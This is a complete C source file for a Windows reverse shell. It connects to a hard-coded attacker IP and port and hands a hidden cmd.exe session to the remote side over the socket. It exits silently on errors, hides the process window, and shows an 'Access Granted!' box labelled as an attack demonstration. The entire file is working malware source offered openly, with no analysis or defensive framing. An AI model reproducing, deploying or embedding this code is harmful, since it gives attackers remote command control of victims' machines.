#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>

// Link the winsock library
#pragma comment(lib, "Ws2_32.lib")

void reverse_shell() {
    SOCKET shell;
    struct sockaddr_in shell_addr;
    WSADATA wsa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    int connect;
    char ip_addr[] = "192.168.1.57"; // Replace with your attacker's IP
    int port = 1234; // Replace with your desired port

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return; // Exit silently if Winsock initialization fails
    }

    // Create a TCP socket
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (shell == INVALID_SOCKET) {
        WSACleanup();
        return; // Exit silently if socket creation fails
    }

    // Set up the sockaddr_in structure
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_port = htons(port);
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    // Connect to the attacker machine
    connect = WSAConnect(shell, (struct sockaddr*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
    if (connect == SOCKET_ERROR) {
        closesocket(shell);
        WSACleanup();
        return; // Exit silently if connection fails
    }

    // Zero out memory for process creation structures
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Run in hidden mode
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;

    // Command to execute
    char cmd[] = "cmd.exe";

    // Spawn the shell
    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        closesocket(shell);
        WSACleanup();
        return; // Exit silently if process creation fails
    }

    // Wait for the shell process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(shell);
    WSACleanup();
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     //Attack Demonstration
    MessageBox(NULL, TEXT("Reverse Shell Opened in Target Machine"), TEXT("Access Granted!"), MB_OK | MB_ICONERROR);
    reverse_shell();
    return 0;
}
